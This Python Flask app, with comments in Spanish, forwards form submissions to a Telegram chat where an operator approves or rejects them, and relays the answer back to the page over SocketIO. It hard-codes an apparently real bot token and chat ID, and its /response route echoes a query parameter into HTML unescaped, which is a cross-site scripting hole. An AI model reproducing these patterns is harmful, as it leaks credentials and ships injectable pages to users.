import os
from flask import Flask, request, render_template, jsonify
from flask_socketio import SocketIO, emit
import requests

app = Flask(__name__)
socketio = SocketIO(app)

TOKEN = "7960598167:AAHebdzdX9DY2yYvcaGSDP0U6csATq87nyk"
CHAT_ID = "-1002289203228"
WEBHOOK_URL = "https://web-production-dae16.up.railway.app"

# Ruta principal: Página web
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para manejar datos ingresados
@app.route('/submit', methods=['POST'])
def submit():
    data = request.form['data']
    message = f"Nuevo dato recibido: {data}\nPor favor selecciona una opción:"
    send_message_to_telegram_with_buttons(message)
    return jsonify({"status": "success", "message": "Datos enviados a Telegram con opciones."})

# Ruta para recibir webhook de Telegram
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        callback_query = update["callback_query"]
        data = callback_query["data"]
        chat_id = callback_query["message"]["chat"]["id"]

        if data == "approve":
            response_message = "El dato fue aprobado. 🎉"
        elif data == "reject":
            response_message = "El dato fue rechazado. ❌"
        else:
            response_message = "Acción no reconocida."

        # Enviar mensaje de confirmación a Telegram
        send_message_to_telegram(response_message)

        # Notificar a la página web sobre la respuesta
        socketio.emit('telegram_response', {'response': response_message})

    return jsonify({"status": "ok"})

@app.route('/response')
def response_page():
    message = request.args.get('message', 'No se recibió respuesta.')
    return f"""
    <html>
    <head><title>Respuesta</title></head>
    <body style="display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif;">
        <div style="text-align: center;">
            <h1>Respuesta de Telegram</h1>
            <p>{message}</p>
            <a href="/">Regresar al formulario</a>
        </div>
    </body>
    </html>
    """

# Función para enviar mensajes con botones a Telegram
def send_message_to_telegram_with_buttons(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Aprobar", "callback_data": "approve"}],
            [{"text": "❌ Rechazar", "callback_data": "reject"}]
        ]
    }
    payload = {"chat_id": CHAT_ID, "text": message, "reply_markup": keyboard}
    requests.post(url, json=payload)

# Función para enviar mensajes simples a Telegram
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, json=payload)

if __name__ == '__main__':
    # Configurar el webhook en Telegram
    webhook_url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    payload = {"url": f"{WEBHOOK_URL}/webhook"}
    response = requests.post(webhook_url, json=payload)
    print("Webhook configurado:", response.json())
    
    # Ejecutar la app Flask con soporte de SocketIO
    port = int(os.environ.get("PORT", 5000))  # Obtiene el puerto desde las variables de entorno
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)


